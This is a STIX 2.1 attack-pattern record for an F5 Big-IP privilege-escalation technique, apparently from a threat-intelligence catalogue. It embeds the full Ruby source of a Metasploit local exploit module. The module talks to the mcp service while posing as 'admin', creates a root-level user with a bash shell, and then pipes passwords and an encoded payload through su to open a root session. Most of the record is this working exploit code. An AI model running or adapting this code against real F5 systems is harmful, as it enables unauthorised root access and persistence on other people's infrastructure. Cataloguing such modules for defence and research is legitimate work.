{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--27089f76-0077-422f-b5cb-dc976c71b6fe",
    "created": "2024-08-14T16:58:59.530389Z",
    "modified": "2024-08-14T16:58:59.530394Z",
    "name": "F5 Big-IP Create Admin User",
    "description": " This creates a local user with a username/password and root-level privileges. Note that a root-level account is not required to do this which makes it a privilege escalation issue.  Note that this is pretty noisy, since it creates a user account and creates log files and such. Additionally, most (if not all) vulnerabilities in F5 grant root access anyways.  Adapted from https://github.com/rbowes-r7/refreshing-mcp-tool/blob/main/mcp-privesc.rb  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/f5_create_user.rb",
            "external_id": "f5_create_user.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2022/11/16/cve-2022-41622-and-cve-2022-41800-fixed-f5-big-ip-and-icontrol-rest-vulnerabilities-and-exposures/"
        },
        {
            "source_name": "reference",
            "url": "https://support.f5.com/csp/article/K97843387"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'unix_crypt'\n\nclass MetasploitModule < Msf::Exploit::Local\n  include Msf::Post::Linux::F5Mcp\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'F5 Big-IP Create Admin User',\n        'Description' => %q{\n          This creates a local user with a username/password and root-level\n          privileges. Note that a root-level account is not required to do this,\n          which makes it a privilege escalation issue.\n\n          Note that this is pretty noisy, since it creates a user account and\n          creates log files and such. Additionally, most (if not all)\n          vulnerabilities in F5 grant root access anyways.\n\n          Adapted from https://github.com/rbowes-r7/refreshing-mcp-tool/blob/main/mcp-privesc.rb\n        },\n        'License' => MSF_LICENSE,\n        'Author' => ['Ron Bowes'],\n        'Platform' => [ 'unix', 'linux', 'python' ],\n        'SessionTypes' => ['shell', 'meterpreter'],\n        'References' => [\n          ['URL', 'https://github.com/rbowes-r7/refreshing-mcp-tool'], # Original PoC\n          ['URL', 'https://www.rapid7.com/blog/post/2022/11/16/cve-2022-41622-and-cve-2022-41800-fixed-f5-big-ip-and-icontrol-rest-vulnerabilities-and-exposures/'],\n          ['URL', 'https://support.f5.com/csp/article/K97843387'],\n        ],\n        'Privileged' => true,\n        'DisclosureDate' => '2022-11-16',\n        'Arch' => [ ARCH_CMD, ARCH_PYTHON ],\n        'Type' => :unix_cmd,\n        'Targets' => [[ 'Auto', {} ]],\n        'Notes' => {\n          'Stability' => [],\n          'Reliability' => [],\n          'SideEffects' => []\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('USERNAME', [true, 'Username to create (default: random)', Rex::Text.rand_text_alphanumeric(8)]),\n      OptString.new('PASSWORD', [true, 'Password for the new user (default: random)', Rex::Text.rand_text_alphanumeric(12)]),\n\n      OptBool.new('CREATE_SESSION', [true, 'If set, use the new account to create a root session', true]),\n    ])\n  end\n\n  def exploit\n    # Get or generate the username/password\n    fail_with(Failure::BadConfig, 'USERNAME cannot be empty') if datastore['USERNAME'].empty?\n    username = datastore['USERNAME']\n\n    if datastore['CREATE_SESSION']\n      password = Rex::Text.rand_text_alphanumeric(12)\n      new_password = datastore['PASSWORD'] || Rex::Text.rand_text_alphanumeric(12)\n\n      print_status(\"Will attempt to create user #{username} / #{password}, then change password to #{new_password} when creating a session\")\n    else\n      password = datastore['PASSWORD'] || Rex::Text.rand_text_alphanumeric(12)\n\n      print_status(\"Will attempt to create user #{username} / #{password}\")\n    end\n\n    # If the password is already hashed, leave it as-is\n    vprint_status('Hashing the password with SHA512')\n    hashed_password = UnixCrypt::SHA512.build(password)\n\n    if !hashed_password || hashed_password.empty?\n      fail_with(Failure::BadConfig, 'Failed to hash the password with String.crypt')\n    end\n\n    # These requests have to go in a single 'session', which, to us, is\n    # a single packet (since we don't have AF_UNIX sockets)\n    result = mcp_send_recv([\n      # Authenticate as 'admin' (this probably shouldn't work but does)\n      mcp_build('user_authenticated', 'structure', [\n        mcp_build('user_authenticated_name', 'string', 'admin')\n      ]),\n\n      # Start transaction\n      mcp_build('start_transaction', 'structure', [\n        mcp_build('start_transaction_load_type', 'ulong', 0)\n      ]),\n\n      # Create the role mapping\n      mcp_build('create', 'structure', [\n        mcp_build('user_role_partition', 'structure', [\n          mcp_build('user_role_partition_user', 'string', username),\n          mcp_build('user_role_partition_role', 'ulong', 0),\n          mcp_build('user_role_partition_partition', 'string', '[All]'),\n        ])\n      ]),\n\n      # Create the userdb entry\n      mcp_build('create', 'structure', [\n        mcp_build('userdb_entry', 'structure', [\n          mcp_build('userdb_entry_name', 'string', username),\n          mcp_build('userdb_entry_partition_id', 'string', 'Common'),\n          mcp_build('userdb_entry_is_system', 'ulong', 0),\n          mcp_build('userdb_entry_shell', 'string', '/bin/bash'),\n          mcp_build('userdb_entry_is_crypted', 'ulong', 1),\n          mcp_build('userdb_entry_passwd', 'string', hashed_password),\n        ])\n      ]),\n\n      # Finish the transaction\n      mcp_build('end_transaction', 'structure', [])\n    ])\n\n    # Handle errors\n    if result.nil?\n      fail_with(Failure::Unknown, 'Request to mcp appeared to fail')\n    end\n\n    # The only result we really care about is an error\n    error_returned = false\n    result.each do |r|\n      result = mcp_get_single(r, 'result')\n      result_code = mcp_get_single(result, 'result_code')\n\n      # If there's no code or it's zero, just ignore it\n      if result_code.nil? || result_code == 0\n        next\n      end\n\n      # If we're here, an error was returned!\n      error_returned = true\n\n      # Otherwise, try and get result_message\n      result_message = mcp_get_single(result, 'result_message')\n      if result_message.nil?\n        print_warning(\"mcp query returned a non-zero result (#{result_code}), but no error message\")\n      else\n        print_error(\"mcp query returned an error message: #{result_message} (code: #{result_code})\")\n      end\n    end\n\n    # Let them know if it likely worked\n    if !error_returned\n      print_good(\"Service didn't return an error, so user was likely created!\")\n\n      if datastore['CREATE_SESSION']\n        print_status('Attempting create a root session...')\n\n        out = cmd_exec(\"echo -ne \\\"#{password}\\\\n#{password}\\\\n#{new_password}\\\\n#{new_password}\\\\n#{payload.encoded}\\\\n\\\" | su #{username}\")\n\n        vprint_status(\"Output from su command: #{out}\")\n      end\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2022-11-16",
    "x_mitre_platforms": [
        "[ 'unix', 'linux', 'python' ]"
    ]
}